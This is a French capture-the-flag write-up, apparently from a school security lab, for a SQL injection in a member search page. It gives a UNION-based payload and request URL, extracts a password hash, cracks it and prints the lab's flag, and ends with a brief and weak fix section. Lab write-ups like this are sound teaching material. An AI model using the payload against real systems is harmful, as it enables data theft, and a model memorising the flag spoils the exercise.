# Explication

Nom de la faille:  SQL_injection_member

Aller sur l'URL:  `http://IP_DARKLY/index.php?page=member`

Il y a un input afin de chercher un memebre.

Commme expliqué précedemment, on a réussi à obtenir le schéma complet de la base SQL.

Pour cette faille là, on va se concentrer sur la table Member_Sql_Injection.users qui a pour colonnes:

 `column user_id,  first_name, last_name, Commentaire, town, country, planet, countersign`

En faisaint l'injection SQL:
```
     1 OR 1=1 UNION select Commentaire, countersign FROM Member_Sql_Injection.users
```

http://10.11.200.169/?page=searchimg&id=1+OR+1%3D1+UNION+select+Commentaire%2C+countersign+FROM+Member_Sql_Injection.users&Submit=Submit#


On trouve un 
```
    Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
    countersign: 5ff9d0165b4f92b14994e5c685cdce28
```

On fait un md5 decrypt sur le countersign et on obtient `fortyTwo`.
On met tout en minuscule, puis on applique  sur `fortytwo` un SHA256.
On obtient le flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


# Comment profiter de la faille ?

Une injection SQL peut mener à une destruction ou vol de données confidentielles.

Par exemple : vol de mots de passes, adresses email, ...

# Comment la fixe ?

Une des solutions les plus simples pour se prémunir de ce genre d'injections, il est possible d'utiliser différents outils (mySqli, PDO, ...).
Manuellement, cela consiste à vérifier qu'il n'y a aucun opérateur SQL dans la variable injectée.